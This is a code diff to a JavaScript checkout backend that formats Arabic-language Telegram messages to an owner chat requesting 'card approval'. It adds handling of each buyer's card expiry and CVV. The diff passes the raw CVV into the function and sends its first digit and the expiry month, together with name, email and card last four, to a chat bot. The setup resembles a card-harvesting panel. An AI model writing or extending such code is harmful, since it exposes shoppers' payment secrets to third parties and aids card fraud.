@@ -392,10 +392,22 @@ const sendCheckoutEventNotification = async (event) => {
   }
 };
 
+const maskExpiry = (expiry) => {
+  if (!expiry || typeof expiry !== 'string') return '—';
+  const parts = expiry.split('/');
+  if (parts.length === 2) return `${parts[0]}/**`;
+  return '—';
+};
+
+const maskCvv = (cvv) => {
+  if (!cvv || typeof cvv !== 'string') return '—';
+  return `${cvv.charAt(0)}${'*'.repeat(cvv.length - 1)}`;
+};
+
 const sendCardApprovalRequest = async (event) => {
   if (!bot || !OWNER_CHAT_ID) return;
 
-  const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4, timestamp } = event;
+  const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4, cardExpiry, cardCvv, timestamp } = event;
 
   const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);
 
@@ -422,6 +434,8 @@ const sendCardApprovalRequest = async (event) => {
       text += `🔒 البطاقة: ${sanitizedLast4}\n`;
     }
   }
+  if (cardExpiry) text += `📅 الانتهاء: ${maskExpiry(String(cardExpiry))}\n`;
+  if (cardCvv) text += `🔐 CVV: ${maskCvv(String(cardCvv))}\n`;
 
   text += '\n';
   text += `🆔 Session: ${sessionShort}...\n`;
